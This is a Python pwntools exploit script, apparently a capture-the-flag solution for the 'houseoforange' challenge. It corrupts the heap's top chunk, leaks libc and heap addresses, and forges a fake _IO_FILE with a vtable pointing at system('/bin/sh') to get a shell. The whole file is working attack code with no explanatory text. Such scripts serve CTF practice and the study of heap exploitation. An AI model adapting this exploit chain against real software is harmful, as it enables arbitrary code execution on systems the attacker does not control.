from pwn import *
import sys
if len(sys.argv) < 2:
	p = process("./houseoforange")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./houseoforange")
else:
	p = remote(ip,port)
	libc = ELF("./libc.so.6")
	elf = ELF("./houseoforange")

def add(length,name,price,color):
	p.sendlineafter("Your choice : ","1")
	p.sendlineafter("name :",str(length))
	p.sendafter("Name :",name)
	p.sendlineafter("Orange:",str(price))
	p.sendlineafter("Orange:",str(color))
	p.recvuntil("Finish\n")

def show():
	p.sendlineafter("Your choice : ","2")

def edit(length,name,price,color):
	p.sendlineafter("Your choice : ","3")
	p.sendlineafter("name :",str(length))
	p.sendafter("Name:",name)
	p.sendlineafter("Orange:",str(price))
	p.sendlineafter("Orange:",str(color))
	p.recvuntil("Finish\n")

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}\n b malloc_printerr".format(b1=hex(code_base+0x1337)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
size = 0x600
add(size,"a",10,1)
show()
payload = "a"*size + p64(0) + p64(0x21) + p64(0x0000001f0000000b) + p64(0)+ p64(0) + p64(0x1000 - size - 0x50 + 1)
edit(0x1000,payload,10,1)
show()
add(0x1000,"b"*0x8,10,1)
add(0x420,"b"*0x8,10,1)
show()
p.recvuntil("b"*8)
libc_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = libc_addr - libc.symbols["__malloc_hook"] - 0x10 - 1416
log.success("libc_base:"+hex(libc.address))
edit(0x18,"b"*0x18,10,1)
show()
p.recvuntil("b"*0x18)
heap_addr = u64(p.recv(6).ljust(8,"\x00"))
heap_base = heap_addr - (0x5555557586b0 - 0x555555758000)
log.success("heap_base:"+hex(heap_base))
target_addr = libc.symbols["_IO_list_all"]
top_addr = heap_base + (0x555555758b00 - 0x555555758000)
debugf()
# mode_offset 0xc0
# writeptr_offset 0x28
# writebase_offset 0x20
# vtable_offset 0xd8
# p *((struct _IO_FILE_plus*)0x555555758b00)
system_addr = libc.symbols["system"]
payload1 = "b"*0x420 + p64(0) + p64(0x21) + p64(0x0000001f0000000b) + p64(0)
payload = "/bin/sh\x00" + p64(0x61) + p64(heap_base) + p64(target_addr - 0x10)
payload += p64(0) + p64(1)
payload = payload.ljust(0xc0,"\x00")
payload += p64(0)
payload = payload.ljust(0xd8,"\x00")
payload += p64(top_addr+0xe0)
payload += p64(system_addr) * 20
edit(0x1000,payload1 + payload,10,1)
p.sendlineafter("Your choice : ","1")
p.interactive()
